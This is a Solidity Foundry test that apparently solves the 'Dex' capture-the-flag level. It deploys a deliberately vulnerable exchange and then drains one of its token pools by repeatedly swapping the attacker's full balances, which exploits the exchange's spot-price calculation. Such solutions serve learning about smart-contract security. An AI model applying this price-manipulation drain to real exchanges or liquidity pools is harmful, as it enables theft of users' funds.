// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Dex, SwappableToken} from "../../src/Dex/Level.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDex {
  function setTokens(address _token1, address _token2) external;

  function addLiquidity(address token_address, uint amount) external;

  function getSwapPrice(address from, address to, uint amount) external view returns (uint);

  function swap(address from, address to, uint amount) external;
}

contract DexTest is LevelFactory {
  IDex dex;
  IERC20 weth;
  IERC20 fether;

  function setUp() public {
    vm.startPrank(deployer, deployer);
    dex = IDex(address(new Dex()));
    weth = IERC20(address(new SwappableToken(address(dex), "Wrapped Ether", "WETH", 1000)));
    fether = IERC20(address(new SwappableToken(address(dex), "Fether", "FTR", 1000000)));
    vm.stopPrank();
  }

  function testAttack() public {
    submitLevel("Dex");
  }

  function _performTest() internal override {
    weth.approve(address(dex), uint(-1));
    fether.approve(address(dex), uint(-1));

    for (uint i; i < 2; i++) {
      emit log_named_uint("i", i);
      dex.swap(address(weth), address(fether), weth.balanceOf(attacker));
      dex.swap(address(fether), address(weth), fether.balanceOf(attacker));

      getStuff();
    }

    // We should be able to sink all weth.
    emit log("---------------");

    getMoreStuff();

    dex.swap(address(weth), address(fether), weth.balanceOf(attacker));

    getMoreStuff();

    dex.swap(address(fether), address(weth), fether.balanceOf(address(dex)));
  }

  function getInputPrice(address from, address to, uint amountOut) public view returns (uint amountIn) {
    return (amountOut * IERC20(from).balanceOf(address(dex))) / IERC20(to).balanceOf(address(dex));
  }

  function getStuff() public {
    emit log_named_uint("Weth remaining", weth.balanceOf(address(dex)));
    emit log_named_uint("Feth remaining", fether.balanceOf(address(dex)));
  }

  function getMoreStuff() public {
    getStuff();

    emit log_named_uint("Weth balance", weth.balanceOf(attacker));
    emit log_named_uint("Feth balance", fether.balanceOf(attacker));
  }

  function _setupTest() internal override {
    // Approving to dex
    weth.approve(address(dex), uint(-1));
    fether.approve(address(dex), uint(-1));

    // Creating the pair
    dex.setTokens(address(weth), address(fether));

    // Adding liquidity
    dex.addLiquidity(address(weth), 100);
    dex.addLiquidity(address(fether), 100);

    // Transferring tokens to attacker
    weth.transfer(attacker, 10);
    fether.transfer(attacker, 10);
  }

  function _checkTest() internal override returns (bool) {
    assertTrue(weth.balanceOf(address(dex)) == 0 || fether.balanceOf(address(dex)) == 0);

    return weth.balanceOf(address(dex)) == 0 || fether.balanceOf(address(dex)) == 0;
  }
}
